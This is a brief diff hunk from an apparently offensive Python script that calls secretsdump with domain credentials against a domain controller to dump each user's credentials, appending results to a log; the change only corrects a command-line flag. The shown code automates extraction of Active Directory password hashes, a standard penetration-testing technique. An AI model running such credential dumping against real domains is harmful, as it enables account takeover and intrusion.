@@ -25,7 +25,7 @@ with open(output_file, "a") as log:  # Open once and keep appending
             "python3",
             secretsdump_path,
             f"{domain}/{username}:{password}@{dc_ip}",
-            "--just-dc-user", user
+            "-just-dc-user", user
         ]
 
         try:
